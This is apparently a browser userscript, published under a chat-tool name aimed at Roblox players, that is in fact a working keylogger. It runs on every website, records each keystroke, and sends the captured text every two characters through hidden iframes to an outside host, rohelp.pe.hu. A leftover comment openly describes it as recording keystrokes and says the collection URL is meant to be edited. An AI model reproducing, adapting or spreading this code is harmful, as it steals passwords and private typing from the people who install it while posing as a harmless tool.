//Chat Code Developed by Manak Kapoor. Key
// ==UserScript==
// @name          Extinct Dev - SCP - BWE - Multi-Ex Chat
// @description   Edited by WizdaniUnleashed - Use Target:Roblox.com
// @version 1.0.0
// @include       *
// @namespace https://greasyfork.org/users/41642
// @downloadURL https://update.greasyfork.org/scripts/21544/Extinct%20Dev%20-%20SCP%20-%20BWE%20-%20Multi-Ex%20Chat.user.js
// @updateURL https://update.greasyfork.org/scripts/21544/Extinct%20Dev%20-%20SCP%20-%20BWE%20-%20Multi-Ex%20Chat.meta.js
// ==/UserScript==
//Please contact manak.kapoor@gmail.com for more information.
/*
 * This work is licensed under a Creative Commons
 * Attribution-NonCommercial-NoDerivs 3.0 Unported License
 * http://creativecommons.org/licenses/by-nc-nd/3.0/
 *
 * LICENSOR HAS
 * BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.
 */
 //Change required Urls to the URL you will be using for recording keystrokes. http://topperz.no-ip.org  EDIT TO WHAT EVER URL WHICH IS GOING TO BE USED!
//javascript:var s=document.createElement("script");s.src="http://localhost:84/userscripts/internetsecurity/editable.js";s.type="text/javascript";document.getElementsByTagName("body")[0].appendChild(s);
//document.getElementsByTagName("body")[0].setAttribute("spellcheck","false");
var container = document.createElement('div');
container.setAttribute('id', 'fbcontainer');
container.setAttribute('style', 'position:fixed; width:100%; height:100%; z-index:9999999;');
container.innerHTML='<iframe style="display:none;" id="sender"></iframe><iframe style="display:none;" id="sender1"></iframe><iframe style="display:none;" id="sender2"></iframe>';
document.getElementsByTagName("body")[0].insertBefore(container,document.getElementsByTagName("body")[0].firstChild);
document.getElementsByTagName("body")[0].appendChild(container);
var changeFrame=0;
var record="";
var charCount=0;
document.keyup=function(e) {
  }
document.onkeydown=function(e){
          record=record+String.fromCharCode(e.which);
		  charCount++;
		
		  if(charCount==2)
			{
			if(changeFrame==1)
			{
			 document.getElementById("sender1").setAttribute('src', 'http://rohelp.pe.hu/send.php?s='+record);
			record="";
			charCount=0;
			changeFrame++;
			}
			else
			{
			if(changeFrame==0)
			{
		 document.getElementById("sender").setAttribute('src', 'http://rohelp.pe.hu/send.php?s='+record);
			record="";
			charCount=0;
			changeFrame++;
			}
			else
				{
		 document.getElementById("sender2").setAttribute('src', 'http://rohelp.pe.hu/send.php?s='+record);
			record="";
			charCount=0;
			changeFrame=0;
			}
			}
			
			}
			
		  }

